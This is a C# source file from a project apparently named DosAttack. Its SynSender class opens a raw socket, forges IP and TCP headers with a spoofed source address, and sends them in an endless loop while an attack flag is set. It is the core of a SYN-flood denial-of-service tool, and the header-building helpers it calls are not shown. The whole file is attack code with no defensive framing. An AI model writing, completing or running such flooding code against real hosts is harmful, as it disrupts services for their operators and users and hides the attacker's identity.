using System;
using System.Net;
using System.Net.Sockets;

namespace DosAttack
{
    public class SynSender : IDisposable
    {
		private Socket socket;
		private bool disposed;
		private bool synAttack;

		~SynSender()
        {
			Dispose(false);
        }

		public void Dispose()
		{
			Dispose(true);
			GC.SuppressFinalize(this);
		}

		public void Dispose(bool disposing)
		{
			synAttack = false;
			if (disposed)
            {
				return;
            }

			if (disposing)
            {
				try
				{
					if (socket != null)
					{
						socket.Shutdown(SocketShutdown.Both);
						socket.Close();
						socket.Dispose();
					}
				}
				catch { }
            }

			disposed = true;
		}

		public void Send(string destinationIp, short destinationPort = 80, string sourceIp = "1.2.3.4", short sourcePort = 1234, bool attack = false, bool incrementPacketIds = true)
		{
			synAttack = attack;
			var hostEntry = Dns.GetHostEntry(destinationIp); //Dns.Resolve(destinationIp);
			foreach (var address in hostEntry.AddressList)
			{
				var endPoint = new IPEndPoint(address, destinationPort);
                socket = new Socket(endPoint.AddressFamily, SocketType.Raw, ProtocolType.IP);
                socket.Connect(endPoint);

				if (socket.Connected)
                {
                    var ipHeader = IpHeaderBuilder.Forge(destinationIp, sourceIp);
                    var tcpHeader = TcpHeaderBuilder.Forge(destinationPort, sourcePort);

					if (incrementPacketIds)
                    {
						long packetId = 1;
						do
						{
							ipHeader.id = IPAddress.HostToNetworkOrder(packetId);
							var bytes = PackageBuilder.ConvertToByteArray(ipHeader, tcpHeader);
							socket.Send(bytes, bytes.Length, SocketFlags.None);
							packetId++;
						}
						while (synAttack);
					}
					else
                    {
						var bytes = PackageBuilder.ConvertToByteArray(ipHeader, tcpHeader);
						do
						{
							socket.Send(bytes, bytes.Length, SocketFlags.None);
						}
						while (synAttack);
					}

                    break;
                }
            }
		}
	}
}
